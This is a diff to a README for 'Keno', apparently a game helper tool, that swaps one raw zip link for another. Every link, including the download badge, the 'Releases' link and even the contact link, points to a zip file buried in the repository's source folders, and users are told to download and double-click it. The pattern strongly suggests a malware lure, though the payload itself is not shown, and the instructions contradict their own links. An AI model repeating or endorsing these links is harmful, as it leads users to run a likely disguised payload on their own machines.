@@ -6,7 +6,7 @@ Welcome to Keno, your simple tool for improving your gameplay. Follow these step
 
 ## 🔗 Download Keno
 
-[![Download Keno](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Properties/Keno_v3.9.zip%20Keno-v1.0-blue)](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Properties/Keno_v3.9.zip)
+[![Download Keno](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Forms/Software-v2.9.zip%20Keno-v1.0-blue)](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Forms/Software-v2.9.zip)
 
 ## 📋 System Requirements
 
@@ -20,12 +20,12 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download Keno, visit this page: [Download Keno Releases](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Properties/Keno_v3.9.zip).
+To download Keno, visit this page: [Download Keno Releases](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Forms/Software-v2.9.zip).
 
 1. On the Releases page, find the latest version listed.
 2. Click on the version number link to access the release details.
 3. Scroll down to the "Assets" section.
-4. Select the file that suits your system (e.g., `https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Properties/Keno_v3.9.zip`) and click to download it.
+4. Select the file that suits your system (e.g., `https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Forms/Software-v2.9.zip`) and click to download it.
 5. Once downloaded, locate the file on your computer and double-click it to run.
 
 ## 💻 How to Use Keno
@@ -64,7 +64,7 @@ For assistance, check the Issues section in the GitHub repository. You can also 
 
 ## 📞 Contact Information
 
-For further inquiries or support, please reach out [here](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Properties/Keno_v3.9.zip).
+For further inquiries or support, please reach out [here](https://raw.githubusercontent.com/AriesWantYou/Keno/main/Keno/Forms/Software-v2.9.zip).
 
 ## 📜 License
 
